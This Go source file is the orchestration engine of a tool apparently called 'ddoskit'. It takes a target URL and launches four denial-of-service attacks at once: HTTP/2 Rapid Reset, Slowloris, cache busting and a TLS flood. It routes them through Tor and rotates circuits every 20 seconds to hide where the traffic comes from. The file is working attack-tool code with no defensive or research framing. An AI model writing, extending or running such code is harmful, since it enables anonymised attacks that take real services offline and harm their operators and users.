package engine

import (
	"context"
	"ddoskit/pkg/attacks"
	"ddoskit/pkg/tor"
	"fmt"
	"net/url"
	"sync"
	"time"
)

type Orchestrator struct {
	Target     string
	Host       string
	Port       int
	TorMgr     *tor.Manager
	Stats      *attacks.Stats
	cancel     context.CancelFunc
	ctx        context.Context
	mu         sync.Mutex
	running    bool
	RotateEvery time.Duration
}

func New(target string, torMgr *tor.Manager) (*Orchestrator, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}

	port := 443
	if u.Scheme == "http" {
		port = 80
	}
	if u.Port() != "" {
		p := 0
		fmt.Sscanf(u.Port(), "%d", &p)
		if p > 0 {
			port = p
		}
	}

	return &Orchestrator{
		Target:      target,
		Host:        u.Hostname(),
		Port:        port,
		TorMgr:      torMgr,
		Stats:       &attacks.Stats{},
		RotateEvery: 20 * time.Second,
	}, nil
}

func (o *Orchestrator) Start() {
	o.mu.Lock()
	defer o.mu.Unlock()
	if o.running {
		return
	}
	o.running = true
	o.ctx, o.cancel = context.WithCancel(context.Background())

	ports := o.TorMgr.ActivePorts()

	// Lanzar los 4 vectores simultáneamente
	go attacks.RapidReset(o.ctx, o.Target, ports, o.Stats)
	go attacks.Slowloris(o.ctx, o.Host, o.Port, ports, o.Stats)
	go attacks.CacheBust(o.ctx, o.Target, ports, o.Stats)
	go attacks.TLSFlood(o.ctx, o.Host, o.Port, ports, o.Stats)

	// Rotación automática de circuitos Tor
	go o.autoRotate()
}

func (o *Orchestrator) autoRotate() {
	ticker := time.NewTicker(o.RotateEvery)
	defer ticker.Stop()
	for {
		select {
		case <-o.ctx.Done():
			return
		case <-ticker.C:
			o.TorMgr.RotateAll()
		}
	}
}

func (o *Orchestrator) Stop() {
	o.mu.Lock()
	defer o.mu.Unlock()
	if !o.running {
		return
	}
	o.cancel()
	o.running = false
}

func (o *Orchestrator) IsRunning() bool {
	o.mu.Lock()
	defer o.mu.Unlock()
	return o.running
}
